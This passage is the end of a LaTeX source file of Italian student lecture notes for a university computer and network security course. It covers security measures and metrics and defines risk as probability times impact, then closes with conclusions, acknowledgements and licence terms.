                        \subitem lo stato di aggiornamento di un \texttt{OS} può essere misurato in base al numero di \textit{patch} installate, al numero di \textit{patch} disponibili, al numero di \textit{patch} installate rispetto a quelle disponibili, \dots
                \end{description}
        \subsubsection{Selezione e uso di una misura}
            \paragraph{Selezione} Solo le misure che concorrono la metrica selezionata sono rilevanti. Questo significa che se una misura non contribuisce alla metrica selezionata, allora questa misura non è rilevante. Per fare ciò bisogna definire a priori da quali misure, tra quelle disponibili, si può ricavare la metrica desiderata.
            \paragraph{Uso} Una volta che le misure sono state selezionate bisogna definire come questa contribuisce alla metrica che si vuole ricavare, alcune misure potrebbero contribuire in maniera più importante rispetto ad altre, il peso che queste devono assumere però è difficile da definire.
    \subsection{Rischio}
        \paragraph{Definizione} Il rischio, come visto in precedenza, è dato dalla "\textbf{probabilità di un evento}" moltiplicata per "\textbf{l'impatto che questo evento può avere}". Nel nostro contesto la probabilità che si verifichi un evento è misurata su un determinato (1 anno) periodo di tempo. Il rischio è valutato inoltre in base allo \textit{stakeholder} che lo subisce, in quanto un rischio può essere valutato in maniera diversa in base a chi lo subisce.
        \paragraph{Suddivisione della probabilità} La probabilità di un evento può essere suddivisa in: la probabilità che un bug "\textit{exploitable}" sia presente nel sistema, moltiplicata per la probabilità che un attaccante possa sfruttare questo bug. Mentre il primo riguarda proprietà interne del sistema sulle quali possiamo agire, mentre il secondo riguarda proprietà esterne.
        \paragraph{Obbiettivo} L'obbiettivo della valutazione del rischio è quello di ridurre il rischio a livelli accettabili anche se questo può comportare che una vulnerabilità non venga risolta perché il costo \textit{hardware} e \textit{software} per sfruttarla è troppo alto rispetto all'impatto che potrebbe avere.
    \chapter*{Conclusioni e ringraziamenti}
\thispagestyle{chapterInit}
\addcontentsline{toc}{chapter}{Conclusioni e ringraziamenti}

\section*{Conclusioni}
    In questo documento sono stati trattati i principali argomenti riguardanti il corso di ``\textit{Introduction to computer and network security}'' del professore Ranise Silvio, tenuto presso l'Università degli Studi di Trento nell'anno accademico 2024/2025. Il tutto nell'ambito del secondo anno del corso di laurea triennale in Informatica.
    Durante il corso sono stati affrontati i principali argomenti riguardanti la sicurezza informatica, partendo dalle basi della crittografia fino ad arrivare alle principali tecniche di sicurezza informatica. Inoltre sono stati trattati anche argomenti riguardanti la sicurezza delle reti, partendo dalle basi delle reti di calcolatori fino ad arrivare alle principali tecniche di sicurezza delle reti.\newline 
    Alcuni argomenti e/o sezioni potrebbero essere state omesse o trattate in modo superficiale, per approfondire tali argomenti si consiglia di consultare la bibliografia del corso e/o il materiale direttamente fornito dal professore.

\section*{Ringraziamenti}
    Voglio ringraziare in primo luogo il professore Ranise Silvio per il materiale e le lezioni che ha tenuto durante il corso, per l'interesse e per l'apertura al dialogo e alla discussione che ha dimostrato durante il corso.\newline
    Ringrazio inoltre i miei colleghi di corso per le discussioni e le collaborazioni che ci sono state durante il corso, è grazie anche a loro che ho trovato il tempo e la dedizione per scrivere questi appunti.\newline
    Infine ringrazio chi ha letto o sta leggendo in questo momento questi appunti, spero che siano stati utili come materiale di supporto allo studio e che abbiano aiutato a chiarire e a comprendere meglio gli argomenti trattati durante il corso, e che possano essere utili anche a chi leggerà in futuro.

\vfill
{\footnotesize
    \footnotesize\section*{Note}
    Questi appunti sono stati scritti durante il corso di ``\textit{Introduction to computer and network security}'', tenuto dal prof. Ranise Silvio presso l'Università degli Studi di Trento nell'anno accademico 2024/2025. Gli appunti sono stati scritti in \LaTeX{} e sono disponibili su \href{https://github.com/lucafano04/appuntisecondoanno}{GitHub} e sono rilasciati sotto licenza \href{https://creativecommons.org/licenses/by-nc-sa/4.0/}{CC BY-NC-SA 4.0} come conseguenza sono liberamente utilizzabili e modificabili, ma non possono essere utilizzati a scopi commerciali e devono mantenere la stessa licenza, il materiale rimane liberamente usabile e modificabile nell'ambito accademico, della formazione e della divulgazione scientifica e tecnologica. L'utilizzatore è tenuto a citare l'autore originale e a mantenere la stessa licenza per le opere derivate. Ognuno è libero di usare questi come punto di partenza per lo studio in funzione delle proprie esigenze e di condividerli con chiunque ne possa trarre beneficio, anzi è incoraggiato a farlo.
    L'autore (Luca Facchini) non si assume nessuna responsabilità sull'uso che verrà fatto di questi appunti e non garantisce la completa correttezza e completezza degli stessi, inoltre non si assume nessuna responsabilità per eventuali errori o imprecisioni presenti negli appunti, questi vengono infatti distribuiti \textit{as is} e possono contenere errori o imprecisioni, l'utilizzatore è tenuto a verificare e a correggere eventuali errori presenti negli appunti. Nell'eventualità di errori o imprecisioni si prega di contattare l'autore e/o di aprire una \textit{issue} sul repository di GitHub. (Ultimo aggiornamento: \today)
}
\end{document}